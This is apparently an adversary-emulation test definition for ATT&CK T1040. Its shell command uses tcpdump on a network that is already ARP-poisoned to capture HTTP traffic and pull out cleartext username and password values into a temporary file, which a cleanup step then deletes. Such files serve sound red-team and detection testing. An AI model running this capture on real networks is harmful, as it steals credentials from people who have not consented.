---
id: credential_access_http_intercept
name: HTTP Credential Interception
description: >
  Captura credenciales transmitidas en texto claro sobre HTTP.
  Requiere ARP poisoning activo. T1040.
tactic: credential-access
technique:
  attack_id: T1040
  name: Network Sniffing
platforms:
  linux:
    sh:
      command: |
        source /opt/mitm-scripts/targets.sh
        timeout 60 tcpdump -i eth0 -A -s 0 \
          "tcp port 80 and host $WEBSERVER_IP" 2>/dev/null \
          | grep -oP "(username|password)=[^&\s]+" \
          | tee /tmp/captured_creds.txt
        cat /tmp/captured_creds.txt
cleanup:
  - rm -f /tmp/captured_creds.txt
tags:
  - credential-access
  - T1040
  - MITM
